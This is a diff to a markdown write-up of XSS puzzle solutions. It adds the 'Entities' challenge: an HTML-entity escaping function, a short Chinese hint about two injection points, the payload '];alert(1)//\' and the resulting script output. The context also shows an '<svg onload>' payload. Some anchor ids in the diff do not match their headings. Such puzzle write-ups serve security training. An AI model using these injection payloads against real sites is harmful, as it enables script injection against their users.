@@ -36,7 +36,7 @@
 > - [ ]  <a href="#a025">Fruit 3</a>
 > - [ ]  <a href="#a026">Capitals</a>
 > - [ ]  <a href="#a027">Quine</a>
-> - [ ]  <a href="#a028">Entities</a>
+> - [x]  <a href="#a028">Entities (13)</a>
 > - [ ]  <a href="#a029">Entities 2</a>
 
 <a id="a001"></a>
@@ -686,4 +686,43 @@ Output
 <svg onload="alert(1)"></svg>
 ```
 
+<a name="a025"/></a>
+### Fruit 3
+
+<a name="a027"/></a>
+### Capitals
+
+<a name="a028"/></a>
+### Quine
+
+<a name="a029"/></a>
+### Entities (13)
+```javascript
+// submitted by securityMB
+function escape(s) {
+  function htmlentities(s) {
+    return s.replace(/[&<>"']/g, c => `&#${c.charCodeAt(0)};`)
+  }
+  s = htmlentities(s);
+  return `<script>
+  var obj = {};
+  obj["${s}"] = "${s}";
+</script>`;
+}
+```
+两个注入点，利用好注释符和转义字符
+payload
+```html
+];alert(1)//\
+```
+Output
+```html
+<script>
+  var obj = {};
+  obj["];alert(1)//\"] = "];alert(1)//\";
+</script>
+```
+
+<a name="a030"/></a>
+### Entities 2
 
